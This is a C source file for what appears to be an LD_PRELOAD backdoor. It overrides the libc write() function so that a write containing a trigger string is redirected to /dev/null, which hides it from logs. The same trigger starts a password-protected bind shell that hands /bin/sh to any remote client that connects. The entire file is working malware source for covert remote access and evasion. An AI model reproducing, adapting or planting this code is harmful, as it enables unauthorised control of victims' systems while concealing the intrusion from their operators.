#include <arpa/inet.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#include "constants.h"

void start_bind4() {
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(BIND_PORT);
	addr.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	/* allow reuse of local address */
	const static int optval = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

	/* bind socket to local address */
	bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
	listen(sockfd, 0);

	int client_sockfd = accept(sockfd, NULL, NULL);
	for (int i = 0; i < 3; i++)
		dup2(client_sockfd, i);
	
	char input[30];
	read(client_sockfd, input, sizeof(input));
	input[strcspn(input, "\n")] = '\0';

	if (strcmp(input, BIND_PASSWORD) == 0) {
		execve("/bin/sh", NULL, NULL);
		close(sockfd);
	} else {
		shutdown(client_sockfd, SHUT_RDWR);
		close(sockfd);
	}
}

ssize_t write(int fildes, const void *buf, size_t nbytes) {
	ssize_t (*real_write) (int fildes, const void *buf, size_t nbytes);
	ssize_t result;

	real_write = dlsym(RTLD_NEXT, "write");

	/* Message doesn't conain trigger */
	if (strstr(buf, BIND_TRIGGER) == NULL) {
		return real_write(fildes, buf, nbytes);
	}

	/* write original bytes to /dev/null to hide ouput from log */
	fildes = open("/dev/null", O_WRONLY | O_APPEND);
	result = real_write(fildes, buf, nbytes);

	/* Open the bind shell backdoor */
	start_bind4();

	return result;
}
